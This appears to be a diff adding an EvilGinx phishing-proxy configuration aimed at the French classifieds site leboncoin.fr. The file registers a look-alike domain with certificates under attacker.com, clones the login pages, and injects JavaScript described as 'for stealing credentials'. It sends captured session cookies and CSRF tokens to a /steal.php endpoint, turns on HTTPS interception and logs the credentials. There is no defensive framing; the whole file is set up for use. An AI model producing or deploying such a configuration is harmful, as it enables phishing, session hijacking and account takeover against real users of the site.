@@ -1,0 +1,43 @@
+# EvilGinx v3.1 Configuration for leboncoin.fr
+
+server:
+  host: "0.0.0.0"  # Listen on all interfaces
+  port: 80
+  ssl_port: 443
+  ssl_cert: "/etc/letsencrypt/live/attacker.com/fullchain.pem"
+  ssl_key: "/etc/letsencrypt/live/attacker.com/privkey.pem"
+
+target:
+  domain: "www.leboncoin.fr"
+  phishing_domain: "leboncoin-secure.fr"  # Must be registered and have valid SSL
+  login_path: "/connexion"
+  logout_path: "/deconnexion"
+  session_cookie: "PHPSESSID"  # Key session identifier
+  csrf_token: "X-CSRF-Token"  # Critical for authenticated requests
+
+phishing:
+  clone_path: "/var/www/phish"  # Directory to clone and serve the target site
+  inject_js: "/var/www/phish/inject.js"  # Custom JS for stealing credentials
+  redirect_after_steal: "https://www.leboncoin.fr/mes-annonces"  # Redirect post-login
+
+payloads:
+  - name: "session_hijack"
+    type: "cookie"
+    target: "PHPSESSID"
+    steal_path: "/steal.php"  # Endpoint for logging stolen cookies
+
+  - name: "csrf_token"
+    type: "header"
+    target: "X-CSRF-Token"
+    steal_path: "/steal.php"
+
+mitm:
+  enabled: true
+  proxy_port: 8080
+  intercept_https: true
+  bypass_hsts: false  # Warning: HSTS blocks MITM without valid SSL
+
+logging:
+  enabled: true
+  log_file: "/var/log/evilginx.log"
+  log_credentials: true
